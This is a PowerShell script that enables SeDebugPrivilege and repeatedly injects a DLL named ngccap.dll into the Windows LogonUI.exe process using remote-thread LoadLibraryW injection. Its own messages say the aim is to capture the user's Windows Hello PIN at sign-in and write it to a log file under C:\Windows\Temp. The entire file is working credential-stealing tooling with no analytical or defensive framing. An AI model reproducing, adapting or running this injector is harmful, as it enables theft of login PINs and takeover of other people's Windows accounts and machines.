$dll  = Join-Path $PSScriptRoot 'ngccap.dll'
$plog = 'C:\Windows\Temp\pin_capture.log'          # must match LOGPATH in ngccap.c
$wlog = Join-Path $env:TEMP 'logonui_watch.log'
function W($s){ Add-Content -Encoding UTF8 $wlog ("[{0}] {1}" -f (Get-Date -f 'HH:mm:ss.fff'),$s) }
Set-Content -Encoding UTF8 $wlog "logonui watcher start $(whoami)"
if (-not (Test-Path $dll)) { Write-Error "ngccap.dll not found next to this script. Run build.bat first."; return }

Add-Type -TypeDefinition @'
using System;using System.Runtime.InteropServices;
public static class Priv{
 [DllImport("advapi32",SetLastError=true)] static extern bool OpenProcessToken(IntPtr p,uint a,out IntPtr t);
 [DllImport("advapi32",SetLastError=true)] static extern bool LookupPrivilegeValue(string s,string n,out long l);
 [DllImport("advapi32",SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP tp,int len,IntPtr prev,IntPtr rl);
 [DllImport("kernel32")] static extern IntPtr GetCurrentProcess();
 [StructLayout(LayoutKind.Sequential)] struct TP{ public int count; public long luid; public int attr; }
 public static void Enable(){ IntPtr t; OpenProcessToken(GetCurrentProcess(),0x20,out t); long l; LookupPrivilegeValue(null,"SeDebugPrivilege",out l); TP tp=new TP{count=1,luid=l,attr=2}; AdjustTokenPrivileges(t,false,ref tp,0,IntPtr.Zero,IntPtr.Zero); }
}
public static class Inj{
 [DllImport("kernel32",SetLastError=true)] public static extern IntPtr OpenProcess(uint a,bool i,int pid);
 [DllImport("kernel32",SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr addr,uint size,uint type,uint prot);
 [DllImport("kernel32",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h,IntPtr a,byte[] b,uint size,out UIntPtr wr);
 [DllImport("kernel32",SetLastError=true)] public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr sa,uint stack,IntPtr start,IntPtr param,uint flags,IntPtr tid);
 [DllImport("kernel32",SetLastError=true,CharSet=CharSet.Unicode)] public static extern IntPtr GetModuleHandleW(string m);
 [DllImport("kernel32",SetLastError=true,CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h,string p);
 [DllImport("kernel32",SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr h,uint ms);
 [DllImport("kernel32",SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
}
'@
[Priv]::Enable()

function Inject($tpid){
  $h=[Inj]::OpenProcess(0x1F0FFF,$false,$tpid); if($h -eq [IntPtr]::Zero){ W "open $tpid err $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"; return }
  $b=[Text.Encoding]::Unicode.GetBytes($dll+"`0")
  $mem=[Inj]::VirtualAllocEx($h,[IntPtr]::Zero,[uint32]$b.Length,0x3000,0x04)
  $wr=[UIntPtr]::Zero; [void][Inj]::WriteProcessMemory($h,$mem,$b,[uint32]$b.Length,[ref]$wr)
  $load=[Inj]::GetProcAddress([Inj]::GetModuleHandleW("kernel32.dll"),"LoadLibraryW")
  $t=[Inj]::CreateRemoteThread($h,[IntPtr]::Zero,0,$load,$mem,0,[IntPtr]::Zero)
  if($t -ne [IntPtr]::Zero){ [void][Inj]::WaitForSingleObject($t,6000); [Inj]::CloseHandle($t); W "injected LogonUI PID $tpid" }
  else { W "CRT $tpid err $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
  [Inj]::CloseHandle($h)
}

Write-Host "Watching for LogonUI.exe... lock the workstation (Win+L) and sign in with your PIN."
$done=@{}
$deadline=(Get-Date).AddMinutes(30)
while((Get-Date) -lt $deadline){
  if((Test-Path $plog) -and (Select-String -Path $plog -Pattern 'PIN CAPTURED' -Quiet)){ W "PIN CAPTURED -> stop"; Write-Host "Captured. See $plog"; break }
  foreach($proc in @(Get-Process LogonUI -EA SilentlyContinue)){
    $tpid=$proc.Id
    $has=$false
    try { $has=[bool]((Get-Process -Id $tpid -EA Stop).Modules | Where-Object { $_.ModuleName -eq 'ngccap.dll' }) } catch {}
    if(-not $has -and -not $done.ContainsKey($tpid)){ $done[$tpid]=1; W "LogonUI PID $tpid detected -> inject"; Inject $tpid }
  }
  Start-Sleep -Milliseconds 200
}
W "logonui watcher end"
